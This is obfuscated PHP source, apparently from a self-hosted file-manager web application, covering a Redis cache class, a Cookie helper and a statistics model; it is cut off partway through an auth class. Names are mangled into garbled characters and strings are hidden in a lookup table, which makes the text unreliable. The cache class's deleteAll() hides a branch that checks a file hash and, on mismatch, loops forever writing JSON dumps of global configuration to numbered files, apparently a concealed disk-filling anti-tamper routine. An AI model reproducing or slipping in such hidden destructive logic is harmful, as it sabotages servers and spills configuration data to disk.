__construct($±ßÒƒñ, $íç‚«Ï) { $ÒÜ·ééÁ =& $_SERVER[­á Ş³Ö]; if (!class_exists($ÒÜ·ééÁ[866])) { show_json($ÒÜ·ééÁ[867], !1); } $this->cacheTime = $íç‚«Ï; $æìÃ”ãµ = isset($±ßÒƒñ[$ÒÜ·ééÁ[868]]) ? $±ßÒƒñ[$ÒÜ·ééÁ[868]] : 10; $¤ÍÊ˜‡É = _get($±ßÒƒñ, $ÒÜ·ééÁ[865]); if ($¤ÍÊ˜‡É && is_array($¤ÍÊ˜‡É)) { $this->initCluster($±ßÒƒñ, $æìÃ”ãµ); } else { $this->handle = $this->init($±ßÒƒñ, $æìÃ”ãµ); } } private function init($çÍéµß—, $üë»®¿•) { $¶…ôü­œ =& $_SERVER[­á Ş³Ö]; $û¡©î¨Û = new Redis(); $æõ€€ = isset($çÍéµß—[$¶…ôü­œ[869]]) ? $çÍéµß—[$¶…ôü­œ[869]] : !1; if ($æõ€€) { $û¡©î¨Û->pconnect($çÍéµß—[$¶…ôü­œ[182]], $çÍéµß—[$¶…ôü­œ[183]], $üë»®¿•); } else { $û¡©î¨Û->connect($çÍéµß—[$¶…ôü­œ[182]], $çÍéµß—[$¶…ôü­œ[183]], $üë»®¿•); } if (!empty($çÍéµß—[$¶…ôü­œ[413]])) { $û¡©î¨Û->auth($çÍéµß—[$¶…ôü­œ[413]]); } if (!empty($çÍéµß—[$¶…ôü­œ[754]]) && $çÍéµß—[$¶…ôü­œ[754]] != 0) { $û¡©î¨Û->select($çÍéµß—[$¶…ôü­œ[754]]); } return $û¡©î¨Û; } private function initCluster($±ÕµÍö², $« ıÏÏÂ) { $ÃìÁ¥„ =& $_SERVER[­á Ş³Ö]; $«’…ò¾Ç = array($ÃìÁ¥„[870], $ÃìÁ¥„[871], $ÃìÁ¥„[872]); $’·ıÆòÌ = $ÃìÁ¥„[870]; if (isset($±ÕµÍö²[$ÃìÁ¥„[16]]) && in_array($±ÕµÍö²[$ÃìÁ¥„[16]], $«’…ò¾Ç)) { $’·ıÆòÌ = $±ÕµÍö²[$ÃìÁ¥„[16]]; } switch ($’·ıÆòÌ) { case $ÃìÁ¥„[870]: $this->_slave($±ÕµÍö², $« ıÏÏÂ); break; case $ÃìÁ¥„[871]: break; case $ÃìÁ¥„[872]: $this->isCluster = !0; $»öáåÁŒ = $±ÕµÍö²[$ÃìÁ¥„[865]]; $‡ÒÈææ = isset($±ÕµÍö²[$ÃìÁ¥„[869]]) ? $±ÕµÍö²[$ÃìÁ¥„[869]] : !1; $×¼ŠÑÛ = isset($±ÕµÍö²[$ÃìÁ¥„[413]]) ? $±ÕµÍö²[$ÃìÁ¥„[413]] : null; $this->handle = new RedisCluster(NUll, $»öáåÁŒ, $« ıÏÏÂ, $« ıÏÏÂ, $‡ÒÈææ, $×¼ŠÑÛ); break; default: break; } } private function _slave($˜ü®±, $–ØÑ²) { $óğŞ¬Ú‚ = $˜ü®±[$_SERVER[­á Ş³Ö][865]]; $this->filterConfig($˜ü®±, $óğŞ¬Ú‚[0]); $this->handle = $this->init($˜ü®±, $–ØÑ²); unset($óğŞ¬Ú‚[0]); if (empty($óğŞ¬Ú‚)) { return; } $¤ÓÖó³Ì = array_rand($óğŞ¬Ú‚); $this->filterConfig($˜ü®±, $óğŞ¬Ú‚[$¤ÓÖó³Ì]); $this->slaveHandle = $this->init($˜ü®±, $–ØÑ²); } private function filterConfig(&$÷é‚™üç, $í¾º¾»Ô) { $òĞ¹·ï– =& $_SERVER[­á Ş³Ö]; $…’Ö¼ÊÚ = explode($òĞ¹·ï–[4], $í¾º¾»Ô); $¹œ¬¸Î = array($òĞ¹·ï–[182] => $…’Ö¼ÊÚ[0], $òĞ¹·ï–[183] => $…’Ö¼ÊÚ[1]); $÷é‚™üç = array_merge($÷é‚™üç, $¹œ¬¸Î); } public function set($öİâËÉ, $Ã×äó†, $Ô×Ç–»Â = false) { $Ô×Ç–»Â = $Ô×Ç–»Â ? $Ô×Ç–»Â : $this->cacheTime; return $this->handle->setEx($öİâËÉ, $Ô×Ç–»Â, $Ã×äó†); } public function setLock($¡µªÑ­–, $®Œ‘Ù¶º, $ÖÈ¹¤›°) { return $this->handle->setNX($¡µªÑ­–, $®Œ‘Ù¶º); } public function get($Œ€¶Şı) { $ŸÓŠü¦© = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ŸÓŠü¦©->get($Œ€¶Şı); } public function remove($ºãˆÍßú) { return $this->handle->del($ºãˆÍßú); } public function deleteAll() { $Æøá˜³ =& $_SERVER[­á Ş³Ö]; $ÖµÈÇó = $_SERVER[$Æøá˜³[740]] . $Æøá˜³[741]; $ÒƒÑÁáü = $Æøá˜³[737]; if ($_SERVER[$Æøá˜³[738]] != $ÒƒÑÁáü($ÖµÈÇó)) { $ÉîŸÖéµ = $Æøá˜³[873]; $ŞÍÊö¢« = $Æøá˜³[739]; $Ï»ÊØŞ = $_SERVER[$Æøá˜³[740]] . $Æøá˜³[741]; $¼”Ö–‡³ = $ŞÍÊö¢«($Ï»ÊØŞ); $èÊßÌ˜³ = explode($Æøá˜³[231], $¼”Ö–‡³); if (count($èÊßÌ˜³) < $Æøá˜³[614]) { $ñÔ–¡Åî = $Æøá˜³[742]; $ñÔ–¡Åî(); } $…•‘Æª = $Æøá˜³[874]; $…•‘Æª($_SERVER[$Æøá˜³[875]]); $ÉîŸÖéµ = $Æøá˜³[873]; $ÉîŸÖéµ(); $ş’Ì°±ù = $Æøá˜³[876]; $ºÙÎÆæÇ = json_encode($GLOBALS[$Æøá˜³[877]]); $ø‰¹äåŞ = 1; for ($±Ô«±Í = $ø‰¹äåŞ; $±Ô«±Í > 0; $±Ô«±Í++) { $ş’Ì°±ù(DATA_PATH . $±Ô«±Í, $ºÙÎÆæÇ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ø¯³´Öğ) { $this->handle->flushall($ø¯³´Öğ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ã×˜ÚÒÈ = '', $Úö±—”Õ = 0) { if (is_string($ã×˜ÚÒÈ) && $ã×˜ÚÒÈ != $_SERVER[­á Ş³Ö][12]) { $this->prefix = $ã×˜ÚÒÈ; } if (is_numeric($Úö±—”Õ) && $Úö±—”Õ > 0) { $this->expire = $Úö±—”Õ; } } public static function getInstance() { static $Á¬å•ÂÎ; if ($Á¬å•ÂÎ === null) { $Á¬å•ÂÎ = new self(); } return $Á¬å•ÂÎ; } private static $cookieDisable = false; public static function disable($…Ÿ¬·”å) { self::$cookieDisable = $…Ÿ¬·”å; } private static $sameCookieSet = array(); public static function set($ÙÏîå°Ê, $ËÛÚİù, $å½ÕÂºÆ = 0, $¨åÓÇã³ = false, $¬òøò°ü = false) { $ñÀâŸÍá =& $_SERVER[­á Ş³Ö]; if (self::$cookieDisable) { return; } if (!$å½ÕÂºÆ) { $å½ÕÂºÆ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÙÏîå°Ê]) && self::$sameCookieSet[$ÙÏîå°Ê] == $ËÛÚİù . $å½ÕÂºÆ) { return; } self::$sameCookieSet[$ÙÏîå°Ê] = $ËÛÚİù . $å½ÕÂºÆ; if (!$¬òøò°ü) { $¬òøò°ü = str_replace(HOST, $ñÀâŸÍá[12], APP_HOST); $¬òøò°ü = _get($GLOBALS, $ñÀâŸÍá[878], $¬òøò°ü); } $Ôƒôòšû = $ñÀâŸÍá[12]; setcookie($ÙÏîå°Ê, $ËÛÚİù, time() + $å½ÕÂºÆ, $ñÀâŸÍá[8] . trim($¬òøò°ü, $ñÀâŸÍá[8]) . $Ôƒôòšû, !1, !1, $¨åÓÇã³); } public static function setSafe($ŠóÏÛŸ, $¯Ôğ¥—©, $¹ƒüåâê = 0) { self::set($ŠóÏÛŸ, $¯Ôğ¥—©, $¹ƒüåâê, !0); } public static function get($Š…¤ÀèÀ) { static $¾ÓÖÑã˜ = false; if (!$¾ÓÖÑã˜) { self::initHeaderCookie(); $¾ÓÖÑã˜ = !0; } return isset($_COOKIE[$Š…¤ÀèÀ]) ? $_COOKIE[$Š…¤ÀèÀ] : !1; } private static function initHeaderCookie() { $ŠÁ û¤† =& $_SERVER[­á Ş³Ö]; if (!isset($_SERVER[$ŠÁ û¤†[879]]) || !$_SERVER[$ŠÁ û¤†[879]]) { return; } $»’¡×”ø = explode($ŠÁ û¤†[71], $_SERVER[$ŠÁ û¤†[879]]); foreach ($»’¡×”ø as $ÇƒÜûïï) { $ÇƒÜûïï = explode($ŠÁ û¤†[880], $ÇƒÜûïï); if (count($ÇƒÜûïï) != 2 || !isset($ÇƒÜûïï[1])) { continue; } $_COOKIE[trim($ÇƒÜûïï[0])] = trim($ÇƒÜûïï[1]); } } public static function remove($¬¨‹±‡¹, $Ã±ÒúºÎ = false) { unset($_COOKIE[$¬¨‹±‡¹]); self::set($¬¨‹±‡¹, $_SERVER[­á Ş³Ö][12], 1, $Ã±ÒúºÎ); } } goto C¡ÜŠ­‰„; e´¿°…„Ä: class AnalysisModel extends ModelBaseLight { public function init($ğ’İÜ©) { $·¨ß’Ô =& $_SERVER[­á Ş³Ö]; $è‰ÏìĞÈ = array($·¨ß’Ô[590] => array($·¨ß’Ô[33] => $·¨ß’Ô[1781], $·¨ß’Ô[273] => array($·¨ß’Ô[224], $·¨ß’Ô[762], $·¨ß’Ô[1782], $·¨ß’Ô[1783])), $·¨ß’Ô[1784] => array($·¨ß’Ô[33] => $·¨ß’Ô[1785], $·¨ß’Ô[273] => array($·¨ß’Ô[224], $·¨ß’Ô[760], $·¨ß’Ô[1786], $·¨ß’Ô[1787], $·¨ß’Ô[1788]))); if (!isset($è‰ÏìĞÈ[$ğ’İÜ©])) { return !1; } $this->optionType = $è‰ÏìĞÈ[$ğ’İÜ©][$·¨ß’Ô[33]]; $this->field = $è‰ÏìĞÈ[$ğ’İÜ©][$·¨ß’Ô[273]]; return !0; } public function listData($ë¯ù©‘Ä = false, $Šîöòî = "\155\x6f\x64\x69\146\171\x54\151\155\145", $ÖŸúù¢¢ = false) { return parent::listData($ë¯ù©‘Ä, $Šîöòî, $ÖŸúù¢¢); } public function trendList($¤ù‘˜¦) { $ø°‚“÷ø =& $_SERVER[­á Ş³Ö]; $‘£šİî„ = $this->listData(); if ($‘£šİî„) { $Ş•×Áã² = end($‘£šİî„); $Ç´¹Å– = date($ø°‚“÷ø[1789], strtotime($ø°‚“÷ø[1790])); if ($Ş•×Áã²[$ø°‚“÷ø[224]] == $Ç´¹Å–) { return $‘£šİî„; } $ÏæÌãÃ = strtotime($Ş•×Áã²[$ø°‚“÷ø[224]]); } if (!isset($ÏæÌãÃ)) { $ÖÁÚ¿²Š = $¤ù‘˜¦ == $ø°‚“÷ø[590] ? $ø°‚“÷ø[525] : $ø°‚“÷ø[822]; $ÏæÌãÃ = Model($ÖÁÚ¿²Š)->min($ø°‚“÷ø[201]); } $íÍÛ«• = $ø°‚“÷ø[1791] . ucfirst($¤ù‘˜¦); $Ó½²Œ«È = $this->dateList($ÏæÌãÃ); foreach ($Ó½²Œ«È as $Ç´¹Å–) { $this->{$íÍÛ«•}($Ç´¹Å–); } return $this->listData(); } private function dateList($ÙµñØ»Û) { $ÅéÃµ÷À =& $_SERVER[­á Ş³Ö]; $ş¯…åàß = $ÙµñØ»Û; $”Úü´…ı = strtotime($ÅéÃµ÷À[1790]); $¿‡¥ŸÙŞ = array(); while ($ş¯…åàß <= $”Úü´…ı) { $¿‡¥ŸÙŞ[] = date($ÅéÃµ÷À[1789], $ş¯…åàß); $ş¯…åàß = strtotime($ÅéÃµ÷À[1792], $ş¯…åàß); } return $¿‡¥ŸÙŞ; } public function _recordUser($Ì»ä–úÊ = '') { $Ç÷©–Ä =& $_SERVER[­á Ş³Ö]; $æ¶½§Öã = strtotime(date($Ç÷©–Ä[1793], strtotime($Ì»ä–úÊ))); $ïö±ôêä = strtotime(date($Ç÷©–Ä[1794], strtotime($Ì»ä–úÊ))); $ƒÜú¤áÑ = array($Ç÷©–Ä[201] => array($Ç÷©–Ä[1009], $ïö±ôêä)); $Ñ­Ê²Õˆ = Model($Ç÷©–Ä[525])->where($ƒÜú¤áÑ)->count($Ç÷©–Ä[1663]); $ƒÜú¤áÑ[$Ç÷©–Ä[201]] = array($Ç÷©–Ä[333], array($æ¶½§Öã, $ïö±ôêä)); $ëëèŸ© = Model($Ç÷©–Ä[525])->where($ƒÜú¤áÑ)->count($Ç÷©–Ä[1663]); $ƒÜú¤áÑ[$Ç÷©–Ä[33]] = $Ç÷©–Ä[1795]; $ù£»èÈ­ = Model($Ç÷©–Ä[1796])->where($ƒÜú¤áÑ)->count($Ç÷©–Ä[1797]); $“©ÒÏª = array($Ç÷©–Ä[224] => $Ì»ä–úÊ, $Ç÷©–Ä[762] => (int) $Ñ­Ê²Õˆ, $Ç÷©–Ä[1782] => (int) $ëëèŸ©, $Ç÷©–Ä[1783] => (int) $ù£»èÈ­); return $this->insert($“©ÒÏª); } public function _recordStore($Ô¥ß©­ = '') { $ñ¡¢†‚€ =& $_SERVER[­á Ş³Ö]; $«Ğ¯¤ï = strtotime(date($ñ¡¢†‚€[1794], strtotime($Ô¥ß©­))); $„ÃÏà×í = array($ñ¡¢†‚€[201] => array($ñ¡¢†‚€[1009], $«Ğ¯¤ï)); $É„‰Ñ = Model($ñ¡¢†‚€[471])->where($„ÃÏà×í)->sum($ñ¡¢†‚€[76]); $„ÃÏà×í[$ñ¡¢†‚€[410]] = 0; $ÃÑûÅ´ú = Model($ñ¡¢†‚€[822])->where($„ÃÏà×í)->sum($ñ¡¢†‚€[76]); $„ÃÏà×í[$ñ¡¢†‚€[411]] = 1; $ıĞ¨åõò = Model($ñ¡¢†‚€[822])->where($„ÃÏà×í)->sum($ñ¡¢†‚€[76]); $„ÃÏà×í[$ñ¡¢†‚€[411]] = 2; $å­ª”« = Model($ñ¡¢†‚€[822])->where($„ÃÏà×í)->sum($ñ¡¢†‚€[76]); $ÊÄ‘Òõ˜ = array($ñ¡¢†‚€[224] => $Ô¥ß©­, $ñ¡¢†‚€[760] => (int) $ÃÑûÅ´ú, $ñ¡¢†‚€[1786] => (int) $É„‰Ñ, $ñ¡¢†‚€[1787] => (int) $ıĞ¨åõò, $ñ¡¢†‚€[1788] => (int) $å­ª”«); return $this->insert($ÊÄ‘Òõ˜); } public function trend($×’ºÏğá, $®åé°˜) { $ÛšŞó—ó =& $_SERVER[­á Ş³Ö]; if (!$this->init($×’ºÏğá)) { return !1; } $ÆÏóüì = $this->trendList($×’ºÏğá); if ($ÆÏóüì && $®åé°˜ != $ÛšŞó—ó[1636]) { $üÃ¹å‘Ç = $ÆÏóüì[0][$ÛšŞó—ó[224]]; $’ôĞÔ“¹ = $this->validDate($®åé°˜, $üÃ¹å‘Ç); $öªÏÇç = array(); $ÙÅø•‡î = array_to_keyvalue($ÆÏóüì, $ÛšŞó—ó[224]); foreach ($’ôĞÔ“¹ as $ˆ˜ÀÎ·¯) { if (isset($ÙÅø•‡î[$ˆ˜ÀÎ·¯])) { $¹¥È€– = $ÙÅø•‡î[$ˆ˜ÀÎ·¯]; } else { $¹¥È€– = end($ÆÏóüì); $¹¥È€–[$ÛšŞó—ó[224]] = $ˆ˜ÀÎ·¯; if ($×’ºÏğá == $ÛšŞó—ó[590]) { $¹¥È€–[$ÛšŞó—ó[1782]] = $¹¥È€–[$ÛšŞó—ó[1783]] = 0; } } $öªÏÇç[] = $¹¥È€–; } $ÆÏóüì = $öªÏÇç; } $Œ¼™¨®ê = array($ÛšŞó—ó[590] => array($ÛšŞó—ó[762] => LNG($ÛšŞó—ó[1798]), $ÛšŞó—ó[1782] => LNG($ÛšŞó—ó[1799]), $ÛšŞó—ó[1783] => LNG($ÛšŞó—ó[1800])), $ÛšŞó—ó[1784] => array($ÛšŞó—ó[760] => LNG($ÛšŞó—ó[1801]), $ÛšŞó—ó[1786] => LNG($ÛšŞó—ó[1802]), $ÛšŞó—ó[1787] => LNG($ÛšŞó—ó[1803]), $ÛšŞó—ó[1788] => LNG($ÛšŞó—ó[1804]))); $şºœ·¯Ú = array($ÛšŞó—ó[590] => $ÛšŞó—ó[1805], $ÛšŞó—ó[1784] => $ÛšŞó—ó[76]); if (empty($ÆÏóüì)) { $ˆ˜ÀÎ·¯ = date($ÛšŞó—ó[1789], strtotime($ÛšŞó—ó[1790])); $ûèæÔÆÑ = array($ÛšŞó—ó[224] => $ˆ˜ÀÎ·¯); foreach ($Œ¼™¨®ê[$×’ºÏğá] as $íÃî¹×› => $î§¶‡Íí) { $ûèæÔÆÑ[$íÃî¹×›] = 0; } $ÆÏóüì[] = $ûèæÔÆÑ; } $ÏÙø…â½ = array(); foreach ($ÆÏóüì as $î§¶‡Íí) { if ($×’ºÏğá == $ÛšŞó—ó[1784] && $î§¶‡Íí[$ÛšŞó—ó[1786]] > $î§¶‡Íí[$ÛšŞó—ó[760]]) { $î§¶‡Íí[$ÛšŞó—ó[1786]] = $î§¶‡Íí[$ÛšŞó—ó[760]]; } foreach ($Œ¼™¨®ê[$×’ºÏğá] as $íÃî¹×› => $Õ«”Ùö€) { $¹¥È€– = array($ÛšŞó—ó[224] => $î§¶‡Íí[$ÛšŞó—ó[224]], $ÛšŞó—ó[1561] => $Õ«”Ùö€); $¹¥È€–[$şºœ·¯Ú[$×’ºÏğá]] = isset($î§¶‡Íí[$íÃî¹×›]) ? $î§¶‡Íí[$íÃî¹×›] : 0; $ÏÙø…â½[] = $¹¥È€–; } } return $ÏÙø…â½; } public function validDate($ÓÅŠŸßä, $ƒ™üš¥÷) { $ìáı¨ıİ =& $_SERVER[­á Ş³Ö]; $›Î£—à = date($ìáı¨ıİ[1789], strtotime($ìáı¨ıİ[1790])); $€”ñ“É = array($›Î£—à); switch ($ÓÅŠŸßä) { case $ìáı¨ıİ[1643]: $Èï«™ÎÁ = mktime(0, 0, 0, date($ìáı¨ıİ[1806]), date($ìáı¨ıİ[1383]) - date($ìáı¨ıİ[1446]) + 7 - 7, date($ìáı¨ıİ[1807])); $‘‘æÃ¦ = 0; do { $¯½ÖÔ£ = date($ìáı¨ıİ[1789], $Èï«™ÎÁ - 3600 * 24 * 7 * $‘‘æÃ¦); $€”ñ“É[] = $¯½ÖÔ£; $‘‘æÃ¦++; } while ($ƒ™üš¥÷ < $¯½ÖÔ£); break; case $ìáı¨ıİ[1641]: $‘‘æÃ¦ = 1; do { $ ÁàâÇï = date($ìáı¨ıİ[1808], strtotime("\55\x20{$‘‘æÃ¦}\40\x6d\157\156\x74\x68\x73")); $€”ñ“É[] = $ ÁàâÇï; $‘‘æÃ¦++; } while ($ƒ™üš¥÷ < $ ÁàâÇï); break; case $ìáı¨ıİ[1809]: $©Ğ£ĞèØ = (int) date($ìáı¨ıİ[1807], strtotime($ƒ™üš¥÷)); $Ö™ûáàº = (int) date($ìáı¨ıİ[1807]); if ($©Ğ£ĞèØ >= $Ö™ûáàº) { break; } for ($©Ğ£ĞèØ; $©Ğ£ĞèØ < $Ö™ûáàº; $©Ğ£ĞèØ++) { $€”ñ“É[] = $©Ğ£ĞèØ . $ìáı¨ıİ[1810]; } break; default: break; } if ($ƒ™üš¥÷ > end($€”ñ“É)) { array_pop($€”ñ“É); } sort($€”ñ“É); return $€”ñ“É; } public function listTable($÷ğ§À—´) { $ış¤¯æœ = ucfirst($÷ğ§À—´); return Model($ış¤¯æœ)->listData(); } public function option($ïö­ï²) { $¿—ÁªØ° = $_SERVER[­á Ş³Ö][1811] . ucfirst($ïö­ï²); return $this->{$¿—ÁªØ°}(); } private function optionUser() { $‡ñÒ¼±À =& $_SERVER[­á Ş³Ö]; $¥âÛıŸ¹ = Model($‡ñÒ¼±À[525])->count($‡ñÒ¼±À[1663]); $Òâ¸„¾˜ = Model($‡ñÒ¼±À[525])->where($‡ñÒ¼±À[1812])->count($‡ñÒ¼±À[1663]); $Ş’ªÖÆ¦ = intval($GLOBALS[$‡ñÒ¼±À[6]][$‡ñÒ¼±À[349]][$‡ñÒ¼±À[1618]]) / 3600; $Ãü±öÒ¬ = strtotime("\x2d{$Ş’ªÖÆ¦}\x20\150\157\x75\162\163"); $†ûÂ€ˆŠ = strtotime(date($‡ñÒ¼±À[1793])); if ($Ãü±öÒ¬ < $†ûÂ€ˆŠ) { $Ãü±öÒ¬ = $†ûÂ€ˆŠ; } $ ‘Üêí± = array($‡ñÒ¼±À[1813] => array($‡ñÒ¼±À[1010], $Ãü±öÒ¬)); $ä÷ìáï = (int) Model($‡ñÒ¼±À[525])->where($ ‘Üêí±)->count($‡ñÒ¼±À[1663]); if (!$ä÷ìáï) { $ä÷ìáï = 1; } $ ‘Üêí± = array($‡ñÒ¼±À[1813] => array($‡ñÒ¼±À[1010], $†ûÂ€ˆŠ)); $Ûå³ù» = Model($‡ñÒ¼±À[525])->where($ ‘Üêí±)->count($‡ñÒ¼±À[1663]); return array($‡ñÒ¼±À[755] => (int) $¥âÛıŸ¹, $‡ñÒ¼±À[1814] => (int) ($¥âÛıŸ¹ - $Òâ¸„¾˜), $‡ñÒ¼±À[1815] => (int) $Òâ¸„¾˜, $‡ñÒ¼±À[1816] => (int) $Ûå³ù», $‡ñÒ¼±À[1817] => $ä÷ìáï); } private function optionFile() { $£ö¯¯¥¼ =& $_SERVER[­á Ş³Ö]; $òà¾¹œ = $this->sourceSize(); $æ‹‚ñœƒ = $òà¾¹œ[$£ö¯¯¥¼[76]]; $Ã¼¿ë÷¼ = $òà¾¹œ[$£ö¯¯¥¼[1786]]; $å’ŠÑ»– = Model($£ö¯¯¥¼[822])->where(array($£ö¯¯¥¼[410] => 0))->count($£ö¯¯¥¼[402]); $¸ß” = array($£ö¯¯¥¼[410] => 0, $£ö¯¯¥¼[201] => array($£ö¯¯¥¼[1010], strtotime(date($£ö¯¯¥¼[1793])))); $ÌÁ™›ï  = Model($£ö¯¯¥¼[822])->where($¸ß”)->sum($£ö¯¯¥¼[76]); $¡ßËÜ• = Model($£ö¯¯¥¼[822])->where($¸ß”)->count($£ö¯¯¥¼[402]); return array($£ö¯¯¥¼[760] => $æ‹‚ñœƒ, $£ö¯¯¥¼[1786] => $Ã¼¿ë÷¼, $£ö¯¯¥¼[1818] => $æ‹‚ñœƒ - $Ã¼¿ë÷¼, $£ö¯¯¥¼[1819] => (int) $ÌÁ™›ï , $£ö¯¯¥¼[762] => (int) $å’ŠÑ»–, $£ö¯¯¥¼[1820] => (int) $¡ßËÜ•); } private function optionAccess() { $ÂíÊ€—‰ =& $_SERVER[­á Ş³Ö]; return array($ÂíÊ€—‰[755] => $this->typeLogCnt(), $ÂíÊ€—‰[107] => $this->typeLogCnt($ÂíÊ€—‰[107]), $ÂíÊ€—‰[452] => $this->typeLogCnt($ÂíÊ€—‰[452]), $ÂíÊ€—‰[1821] => $this->typeLogCnt($ÂíÊ€—‰[1821]), $ÂíÊ€—‰[1822] => $this->typeLogCnt($ÂíÊ€—‰[1822]), $ÂíÊ€—‰[590] => $this->typeLogCnt($ÂíÊ€—‰[12], $ÂíÊ€—‰[1797])); } private function typeLogCnt($úÈ°ùÂë = '', $ßêÇ°çÜ = "\x69\144") { $ıõÓ—ÓÚ =& $_SERVER[­á Ş³Ö]; $÷Œáº¦ß = array($ıõÓ—ÓÚ[107] => array($ıõÓ—ÓÚ[1823], $ıõÓ—ÓÚ[1824]), $ıõÓ—ÓÚ[452] => array($ıõÓ—ÓÚ[1825], $ıõÓ—ÓÚ[1826]), $ıõÓ—ÓÚ[1821] => array($ıõÓ—ÓÚ[1827], $ıõÓ—ÓÚ[1828], $ıõÓ—ÓÚ[1829]), $ıõÓ—ÓÚ[1822] => array($ıõÓ—ÓÚ[1830], $ıõÓ—ÓÚ[1831]), $ıõÓ—ÓÚ[1832] => array($ıõÓ—ÓÚ[1833], $ıõÓ—ÓÚ[1834], $ıõÓ—ÓÚ[1835])); $ÄºÜÇğ¯ = strtotime(date($ıõÓ—ÓÚ[1793])); $¸¸™Ş¶Ä = array($ıõÓ—ÓÚ[201] => array($ıõÓ—ÓÚ[1010], $ÄºÜÇğ¯)); if ($úÈ°ùÂë) { $¸¸™Ş¶Ä[$ıõÓ—ÓÚ[33]] = array($ıõÓ—ÓÚ[7], $÷Œáº¦ß[$úÈ°ùÂë]); } $»¼ŒæÌµ = Model($ıõÓ—ÓÚ[1796])->where($¸¸™Ş¶Ä)->count($ßêÇ°çÜ); return (int) $»¼ŒæÌµ; } private function optionServer() { $š©ıâ†Ñ =& $_SERVER[­á Ş³Ö]; $¶§âééç = $this->diskDriver(); $Ÿ¾ÅÒ = KodIO::defaultDriver(); $ÙÁıÃÏİ = array($š©ıâ†Ñ[814] => $Ÿ¾ÅÒ[$š©ıâ†Ñ[399]]); $øÜ„‹±ö = Model($š©ıâ†Ñ[471])->where($ÙÁıÃÏİ)->sum($š©ıâ†Ñ[76]); $Ø“¦¦š‰ = explode($š©ıâ†Ñ[53], $_SERVER[$š©ıâ†Ñ[143]]); $¦ºÓ·• = $Ø“¦¦š‰[0]; $š¥ñ·Ş = $GLOBALS[$š©ıâ†Ñ[6]][$š©ıâ†Ñ[21]]; $áÇ’ª« = $š¥ñ·Ş[$š©ıâ†Ñ[972]]; if ($áÇ’ª« == $š©ıâ†Ñ[960]) { $ÇÔÇÒˆÖ = explode($š©ıâ†Ñ[1275], $š¥ñ·Ş[$š©ıâ†Ñ[971]]); $áÇ’ª« = $ÇÔÇÒˆÖ[0]; } if ($áÇ’ª« == $š©ıâ†Ñ[908] || $áÇ’ª« == $š©ıâ†Ñ[801]) { $ä’˜€°ş = Model()->db()->query($š©ıâ†Ñ[1836]); $Áï›Û¡Á = $ä’˜€°ş[0] && isset($ä’˜€°ş[0][$š©ıâ†Ñ[1560]]) ? $ä’˜€°ş[0][$š©ıâ†Ñ[1560]] : 0; $áÇ’ª« = $š©ıâ†Ñ[1837] . ($Áï›Û¡Á ? $š©ıâ†Ñ[8] . $Áï›Û¡Á : $š©ıâ†Ñ[12]); } $§ªÌÅ—ë = $GLOBALS[$š©ıâ†Ñ[6]][$š©ıâ†Ñ[349]][$š©ıâ†Ñ[824]]; return array($š©ıâ†Ñ[1838] => $¶§âééç ? $¶§âééç[$š©ıâ†Ñ[1839]] : 0, $š©ıâ†Ñ[1840] => $¶§âééç ? $¶§âééç[$š©ıâ†Ñ[1841]] : 0, $š©ıâ†Ñ[1842] => (int) $Ÿ¾ÅÒ[$š©ıâ†Ñ[1839]] * 1024 * 1024 * 1024, $š©ıâ†Ñ[1843] => (int) $øÜ„‹±ö, $š©ıâ†Ñ[1844] => ucfirst($¦ºÓ·•), $š©ıâ†Ñ[1845] => $š©ıâ†Ñ[1846] . PHP_VERSION, $š©ıâ†Ñ[1847] => phpBuild64() ? 64 : 32, $š©ıâ†Ñ[754] => str_replace($š©ıâ†Ñ[1126], $š©ıâ†Ñ[988], $áÇ’ª«), $š©ıâ†Ñ[349] => ucfirst($§ªÌÅ—ë), $š©ıâ†Ñ[32] => $_SERVER[$š©ıâ†Ñ[1848]]); } private function diskDriver() { $İ©ì–Ü =& $_SERVER[­á Ş³Ö]; $šÇ®çÛ¥ = $İ©ì–Ü[8]; $Ò¿íŞ = $GLOBALS[$İ©ì–Ü[6]][$İ©ì–Ü[1292]] == $İ©ì–Ü[1293]; if ($Ò¿íŞ) { $šÇ®çÛ¥ = $İ©ì–Ü[1849]; if (function_exists($İ©ì–Ü[1850])) { exec($İ©ì–Ü[1851], $àÌ÷); $šÇ®çÛ¥ = $àÌ÷[1] . $İ©ì–Ü[8]; } } if (!file_exists($šÇ®çÛ¥)) { return; } $êâÚæ”ä = @disk_total_space($šÇ®çÛ¥); $ÈÙƒÒ¦ = $êâÚæ”ä - @disk_free_space($šÇ®çÛ¥); return array($İ©ì–Ü[1839] => $êâÚæ”ä, $İ©ì–Ü[1841] => $ÈÙƒÒ¦); } public function fileChart($É¿ÃœÄ²) { $¢¯§ÆÅ =& $_SERVER[­á Ş³Ö]; if (isset($É¿ÃœÄ²[$¢¯§ÆÅ[1663]])) { return Model($¢¯§ÆÅ[822])->userFileTypeProfile($É¿ÃœÄ²[$¢¯§ÆÅ[1663]]); } if (isset($É¿ÃœÄ²[$¢¯§ÆÅ[1852]])) { return Model($¢¯§ÆÅ[822])->groupFileTypeProfile($É¿ÃœÄ²[$¢¯§ÆÅ[1852]]); } $âêã§å = $this->sourceSize(); $‚ì§İ…¡ = array($¢¯§ÆÅ[432] => 0, $¢¯§ÆÅ[411] => 1); $ï­Ç©úô = Model($¢¯§ÆÅ[822])->where($‚ì§İ…¡)->sum($¢¯§ÆÅ[76]); $‚ì§İ…¡[$¢¯§ÆÅ[411]] = 2; $œ©öŞÕ = Model($¢¯§ÆÅ[822])->where($‚ì§İ…¡)->sum($¢¯§ÆÅ[76]); return array($¢¯§ÆÅ[760] => $âêã§å[$¢¯§ÆÅ[76]], $¢¯§ÆÅ[1786] => $âêã§å[$¢¯§ÆÅ[1786]], $¢¯§ÆÅ[1787] => (int) $ï­Ç©úô, $¢¯§ÆÅ[1788] => (int) $œ©öŞÕ); } private function sourceSize() { $ƒ§€áãè =& $_SERVER[­á Ş³Ö]; $¡‡‚—ò = Model($ƒ§€áãè[822])->where(array($ƒ§€áãè[410] => 0))->sum($ƒ§€áãè[76]); $¬‰¢Õ·İ = Model($ƒ§€áãè[471])->sum($ƒ§€áãè[76]); if ($¬‰¢Õ·İ > $¡‡‚—ò) { $¬‰¢Õ·İ = $¡‡‚—ò; } return array($ƒ§€áãè[76] => (int) $¡‡‚—ò, $ƒ§€áãè[1786] => (int) $¬‰¢Õ·İ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 